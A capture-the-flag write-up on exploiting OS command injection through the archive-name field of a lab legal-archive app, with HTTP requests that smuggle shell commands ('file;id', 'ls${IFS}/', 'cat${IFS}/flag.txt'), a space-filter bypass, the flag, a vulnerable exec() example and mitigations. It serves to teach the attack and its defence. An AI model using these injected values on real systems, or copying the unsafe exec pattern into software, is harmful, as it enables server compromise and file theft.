---
title: "OS Command Injection via Archive Export Filename | Parchive"
date: 2026-06-01 19:30:00 +0530
categories: [A05 - Injection, OS Command Injection]
tags: [webverselabs-pro, os-command-injection, command-injection, rce, linux, expressjs]
author: Shivansh Sharma
image:
  path: /assets/images/posts/parchive-command-injection.webp
  alt: OS Command Injection via Archive Export Filename | Parchive
---

## Lab Link

Lab: [Parchive](https://dashboard.webverselabs-pro.com/challenges/parchive)

---

## Overview

Parchive is a legal document archival platform that allows users to export case files into downloadable archives.

During testing, the archive export functionality was found to unsafely process user-controlled archive names when generating compressed files on the server. Rather than validating archive names against a strict allowlist, the application relied on weak filtering before passing user input into an operating system command.

By injecting shell metacharacters into the archive name parameter, arbitrary operating system commands could be executed as the web server user.

---

## Objective

Exploit the archive export functionality to achieve command execution and retrieve the flag from the underlying system.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── Command Injection
    └── OS Command Injection
        └── User-Controlled Archive Filename
```

---

## Reconnaissance

The application provides an archive export feature for legal case files.

Reviewing the frontend JavaScript reveals the request responsible for archive generation:

```javascript
fetch('/export', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: new URLSearchParams({
    case_id: caseId,
    archive_name: archName
  })
});
```

The export endpoint accepts:

```text
case_id
archive_name
```

Because archive names are often passed into backend compression utilities such as `tar` or `zip`, the parameter becomes an interesting injection target.

---

## Identifying the Injection Point

A normal request appears as:

```http
POST /export HTTP/2
Host: 72f092ef-4065-parchive-4669e.challenges.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

case_id=case-7741&archive_name=file
```

Response:

```json
{
  "success": true,
  "output": "",
  "download": "/dl/file"
}
```

The archive name is reflected into the generated output path, suggesting it may be incorporated into a backend command.

---

## Testing for Command Injection

A semicolon is introduced to terminate the expected command and execute an additional command.

```http
POST /export HTTP/2
Host: 72f092ef-4065-parchive-4669e.challenges.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

case_id=case-7741&archive_name=file;id
```

Response:

```json
{
  "success": true,
  "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
  "download": "/dl/file;id"
}
```

The response confirms arbitrary command execution as:

```text
www-data
```

The application is vulnerable to OS Command Injection.

---

## Space Filtering Bypass

Initial filesystem enumeration attempts fail because spaces are removed before execution.

Example:

```text
file;find / -name "flag" 2>/dev/null
```

Results in:

```text
/bin/sh: 1: find/-nameflag2: not found
```

The application strips literal spaces from supplied commands.

To bypass this restriction, the shell variable:

```text
${IFS}
```

is used.

`${IFS}` expands to the shell's Internal Field Separator and functions as a space during command parsing.

---

## Enumerating the Filesystem

Using `${IFS}` successfully bypasses the filter.

```http
POST /export HTTP/2
Host: 72f092ef-4065-parchive-4669e.challenges.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

case_id=case-7741&archive_name=file;ls${IFS}/
```

Response:

```text
app
bin
boot
dev
entrypoint.sh
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
uploads
usr
var
```

The root directory contains:

```text
/flag.txt
```

---

## Retrieving the Flag

Read the file directly using:

```http
POST /export HTTP/2
Host: 72f092ef-4065-parchive-4669e.challenges.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

case_id=case-7741&archive_name=file;cat${IFS}/flag.txt
```

Response:

```json
{
  "success": true,
  "output": "WEBVERSE{52a9c24e3a4d44e19a276d1c742c3ad4}\n",
  "download": "/dl/file;cat${IFS}/flag.txt"
}
```

---

## Flag

```text
WEBVERSE{52a9c24e3a4d44e19a276d1c742c3ad4}
```

---

## Proof of Exploitation

Successful command execution:

```text
uid=33(www-data) gid=33(www-data)
```

Filesystem enumeration:

```text
ls${IFS}/
```

Sensitive file disclosure:

```text
cat${IFS}/flag.txt
```

---

## Root Cause Analysis

The application constructs operating system commands using unsanitized user input.

A vulnerable implementation would resemble:

```javascript
exec(`tar -czf ${archive_name}.tar.gz ${caseDir}`);
```

Because user-controlled data is passed directly into a shell interpreter, metacharacters such as:

```text
;
&&
||
$()
`
```

can alter command execution flow.

The application's blacklist-based filtering fails to prevent command injection and can be bypassed using shell parsing techniques such as `${IFS}`.

---

## Impact

An attacker can:

* Execute arbitrary operating system commands
* Enumerate the filesystem
* Read sensitive files
* Access application secrets
* Potentially achieve full server compromise

In real-world environments, command injection vulnerabilities frequently lead to complete application takeover.

---

## Mitigation

### Avoid Shell Execution

Use safe APIs such as:

```javascript
spawn()
execFile()
```

instead of:

```javascript
exec()
```

when handling user input.

### Enforce Strict Allowlists

Restrict archive names to known-safe characters:

```regex
^[a-zA-Z0-9._-]+$
```

Reject all shell metacharacters.

### Avoid String Concatenation

Never build shell commands directly from user input.

### Apply Least Privilege

Run export processes using dedicated low-privilege accounts with restricted filesystem access.

---

## Real-World Insight

Archive-generation features frequently become command injection targets because developers wrap utilities such as:

```text
tar
zip
7z
gzip
```

inside shell commands.

Attackers routinely abuse shell parsing features and bypass weak blacklist filters using techniques such as:

```text
${IFS}
$()
;
&&
||
```

The Parchive challenge demonstrates a critical security principle:

**If untrusted input reaches a shell interpreter, attackers control far more than the intended parameter.**
